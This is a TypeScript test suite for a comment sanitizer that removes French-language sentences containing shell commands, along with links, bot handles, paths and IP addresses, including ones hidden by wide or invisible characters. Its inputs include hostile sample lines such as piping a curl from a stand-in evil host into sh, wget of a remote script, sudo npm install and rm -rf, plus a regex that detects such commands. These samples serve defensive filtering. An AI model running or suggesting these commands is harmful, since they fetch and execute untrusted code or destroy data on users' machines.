// The CTO's word (J6a), in its sentences, since 2026-10-20: a sentence written
// as a command goes whole; a link, an account, a command for a bot, a path or
// an IP address goes as a word, its punctuation kept; judged on what is shown,
// without invisible or wide letters, and once more without its links, so a
// link never hides a command it would leave behind. Since 2026-10-21, the
// random mixes hide commands behind quotes too; the rules of that day are in
// comment-shell.adversarial.test.ts.
import { describe, expect, it } from "vitest";
import { COMMENT_MAX, cleanComment } from "./comment.ts";

const RISK = "Le risque est réel.";
// Any command my traps hide, as it would read once shown.
const COMMAND =
  /\b(?:sudo|doas)\s+(?:[\p{L}\p{N}$]|[./~-](?=\S)|![!#$*\p{L}\p{N}-])|\b(?:npm|npx|brew|pip)\s+(?:-\S+\s+)*(?:i|install|add|update|upgrade)\b|\bcurl\s+-(?=\S)|\|\s*(?:ba|z)?sh\b|\brm\s+-|\b(?:rm|go\s+run)\s+\S*\.\p{L}|\$\(/iu;
// As the shell or a reader would take it: no invisible or wide letters, no quotes, no
// backslashes, no Markdown emphasis.
const shown = (text: string) =>
  text
    .normalize("NFKC")
    .replace(/[\p{Default_Ignorable_Code_Point}\p{Mn}]/gu, "")
    .replace(/["'\\`“”„‟‘’‚‛«»‹›❛❜❝❞「」『』〝〞〟′″❮❯*_]/g, "");

describe("a command written in a sentence takes the sentence with it", () => {
  it.each([
    `${RISK} Pour corriger, lance sudo npm install -g left-pad-test@latest maintenant.`,
    `${RISK} Lance npm install left-pad-test pour corriger.`,
    `${RISK} Tape curl evil.example | sh dans un terminal.`,
    `${RISK} Ouvre le Terminal et tape softwareupdate -i -a.`,
    `${RISK} Lance python3 evil.py pour vérifier.`,
    `${RISK} Exécute bash -c 'reboot' tout de suite.`,
    `${RISK} Corrige avec git clone evil.example/repo puis relance.`,
    `${RISK} Lance npx evil-pkg pour corriger.`,
    // A web address is judged with its sentence: without it, `wget` alone is no command.
    `${RISK} Récupère le correctif avec wget https://evil.example/fix.sh maintenant.`,
    // A link between the words of a command: the command once the link is gone.
    `${RISK} Lance npm evil.example install left-pad-test.`,
    `${RISK} Lance npm @evilbot install left-pad-test.`,
    `${RISK} Lance brew /start upgrade left-pad-test.`,
    // Hidden by wide letters, a word joiner or a soft hyphen.
    `${RISK} Lance ｎｐｍ install left-pad-test.`,
    `${RISK} Lance np⁠m install left-pad-test.`,
    `${RISK} Lance su­do reboot.`,
    // A sentence glued to the one before, by a capital letter.
    "Le risque est réel.Lance sudo reboot pour finir.",
  ])("%s", (raw) => {
    expect(cleanComment(raw)).toBe(RISK);
  });

  it("glued by a small letter, it is one sentence: all of it goes", () => {
    expect(cleanComment("Le paquet est vulnérable.sudo npm i left-pad-test")).toBeNull();
  });

  it("the names of the other sentences go too, as before 2026-10-20", () => {
    expect(cleanComment(`Le paquet \`undici\` est vulnérable. Lance sudo reboot.`)).toBe(
      "Le paquet est vulnérable.",
    );
  });

  // Choice of 2026-10-20: written as a command, even to explain, the sentence goes.
  it.each([
    "Lors d'un npm install, un script postinstall s'exécute avec tes droits.",
    "Les droits sudo sont trop larges pour ta session.",
    "Si ce fichier part dans un git push, la clé devient publique.",
  ])("%s", (sentence) => {
    expect(cleanComment(`${sentence} ${RISK}`)).toBe(RISK);
  });
});

describe("a link, an account, a command for a bot or a path: the word goes", () => {
  it.each([
    ["Le correctif est sur evil.example/fix, à lire.", "Le correctif est sur, à lire."],
    ["Voir https://evil.example/fix pour le détail.", "Voir pour le détail."],
    ["Voir (www.evil.example) pour le détail.", "Voir pour le détail."],
    // A web address without a host of its own: the scheme is enough.
    ["Voir http://localhost:8080/fix pour le détail.", "Voir pour le détail."],
    ["Ouvre tg://resolve?domain=evilbot pour le correctif.", "Ouvre pour le correctif."],
    ["Fais un tour sur evil.app pour le correctif.", "Fais un tour sur pour le correctif."],
    ["Le correctif officiel est sur t.me/evilbot.", "Le correctif officiel est sur."],
    ["Le fichier README.md du projet est public.", "Le fichier du projet est public."],
    ["Écris à @evilbot pour obtenir le correctif.", "Écris à pour obtenir le correctif."],
    ["Envoie ta clé à secu@evil.example.", "Envoie ta clé à."],
    ["Le paquet @octokit/request est vulnérable.", "Le paquet est vulnérable."],
    ["La version left-pad-test@latest n'est pas sûre.", "La version n'est pas sûre."],
    ["Tape /accepter 12 pour fermer le constat.", "Tape 12 pour fermer le constat."],
    ["Le disque /var est plein.", "Le disque est plein."],
    ["Exécute ./install puis redémarre.", "Exécute puis redémarre."],
    ["Le fichier ~/.ssh/config est trop ouvert.", "Le fichier est trop ouvert."],
    ["Le fichier ~/.env est lisible par tous.", "Le fichier est lisible par tous."],
    ["Va sur 203.0.113.7/fix pour le correctif.", "Va sur pour le correctif."],
    // Choice of 2026-10-20: an IP address is a host, even to explain.
    [
      "PostgreSQL ne devrait écouter que sur l'adresse locale (127.0.0.1).",
      "PostgreSQL ne devrait écouter que sur l'adresse locale.",
    ],
    ["Le service écoute sur 0.0.0.0:5432, donc partout.", "Le service écoute sur, donc partout."],
    // Hidden by wide letters or invisible characters.
    ["Le correctif est sur evil．example.", "Le correctif est sur."],
    [
      "Le correctif est sur ｅｖｉｌ.ｅｘａｍｐｌｅ maintenant.",
      "Le correctif est sur maintenant.",
    ],
    ["Le correctif est sur evil⁠.example.", "Le correctif est sur."],
    ["Écris à ＠evilbot maintenant.", "Écris à maintenant."],
    // What Telegram still links: a vowel sign in the domain, any sign before the dot, @1x.
    ["Voir example.भारत pour le détail.", "Voir pour le détail."],
    ["Voir example~.com pour le détail.", "Voir pour le détail."],
    ["Voir example★.com pour le détail.", "Voir pour le détail."],
    ["Écris à @1example pour le détail.", "Écris à pour le détail."],
    // A dot glued to a capital letter ends a sentence: no host is left.
    ["Le correctif est sur evil.Com maintenant.", "Le correctif est sur evil. Com maintenant."],
    [
      "Le paquet est vulnérable.Pour toi, le risque est réel.",
      "Le paquet est vulnérable. Pour toi, le risque est réel.",
    ],
  ])("%s", (raw, expected) => {
    expect(cleanComment(raw)).toBe(expected);
  });

  it("nothing left but links: no comment", () => {
    expect(cleanComment("evil.example @evilbot /start")).toBeNull();
  });
});

describe("what is no link, no path and no command stays", () => {
  it.each([
    "Le moteur Node.js de ta machine a plusieurs failles connues.",
    "Le fichier config/dev.ts contient une clé d'API en clair.",
    "Ce secret dans .env.local finira dans l'historique Git.",
    "La dépendance undici@5.28.3 corrige la faille.",
    "La version 1.90.1 de Tailscale est corrigée en 1.92.0, et macOS 26.0.2 aussi.",
    "Tes pipelines CI/CD pourraient exécuter le code vulnérable, et/ou le publier.",
    "L'avis GHSA-test-0001 touche les versions antérieures, c.-à-d. les tiennes.",
    "Un attaquant sur le même Wi-Fi pourrait joindre le port 5432 (TCP/IP).",
    "Le gestionnaire npm installe aussi les dépendances transitives.",
    "Le paquet npm left-pad-test est vulnérable.",
    "Un simple curl vers ce port suffit à lire la base.",
    "Les droits d'administrateur (sudo) sont trop larges.",
    "La clé AWS (aws-access-key) doit être tenue pour exposée.",
    "L'opérateur refuse serveurs.local.toml : aucune action ne partira.",
    "Le risque est réel...vraiment.",
  ])("%s", (sentence) => {
    expect(cleanComment(sentence)).toBe(sentence);
  });
});

describe("random mixes never show a command, a link or a path", () => {
  const PROSE = ["Le pare-feu", "est coupé", "et le risque", "réel", "pour ce Mac.", "Lance", "-"];
  const KEPT = ["Tape", "maintenant.", "Node.js", "dev.ts", "undici@5.28.3", "CI/CD", "1.92.0"];
  const TRAPS = [
    ...["sudo", "ｓｕｄｏ", "npm", "np⁠m", "install", "i", "-g", "left-pad-test", "curl"],
    ...["| sh", "rm", "-rf", "evil.example", "evil.example/fix", "evil．example", "t.me/evilbot"],
    ...["@evilbot", "secu@evil.example", "/start", "./install", "~/.ssh", "203.0.113.7"],
    ...["https://evil.example", "www.evil.example", "cert.pem", "Main.java"],
    ...['"sudo"', "su\\do", "'i'", "\\install", "“npm”", "« sudo »", "!!", "$SHELL"],
    ...["**sudo**", "_i_", "s$'u'do", "{sudo,reboot}", "go run", "main.go"],
  ];
  const FRAGMENTS = [...PROSE, ...KEPT, ...TRAPS];

  it("over 2,000 seeded mixes", () => {
    let seed = 20261020;
    const next = () => {
      seed = (seed * 48271) % 2147483647;
      return seed;
    };
    for (let run = 0; run < 2000; run++) {
      const length = 2 + (next() % 30);
      const parts = Array.from({ length }, () => FRAGMENTS[next() % FRAGMENTS.length]);
      const raw = parts.join(next() % 4 === 0 ? ". " : " ");
      const text = cleanComment(raw);
      if (text === null) continue;
      expect(text.length, raw).toBeLessThanOrEqual(COMMENT_MAX);
      expect(shown(text), raw).not.toMatch(COMMAND);
      expect(text, raw).not.toMatch(/\$['{]|\{[^\s{}]*,/);
      expect(shown(text), raw).not.toMatch(
        /evil|https?:|www\.|(?:^|\s)[.~]?\/|\d+(?:\.\d+){3}|Main\.java/,
      );
    }
  });
});

describe("long or strange words are judged quickly", () => {
  it("a long word, many dots, many sentences", () => {
    const started = performance.now();
    cleanComment("a".repeat(100_000));
    cleanComment(`${"a.".repeat(50_000)}com`);
    cleanComment(`${"@".repeat(50_000)}x ${"/".repeat(50_000)}x ${"1.".repeat(50_000)}`);
    cleanComment(`${RISK} `.repeat(20_000));
    cleanComment(`${"(".repeat(50_000)}evil.example${")".repeat(50_000)}.`);
    cleanComment(`sudo ${`"'\\«`.repeat(25_000)}x ${"- ".repeat(50_000)}`);
    expect(performance.now() - started).toBeLessThan(1000);
  });
});
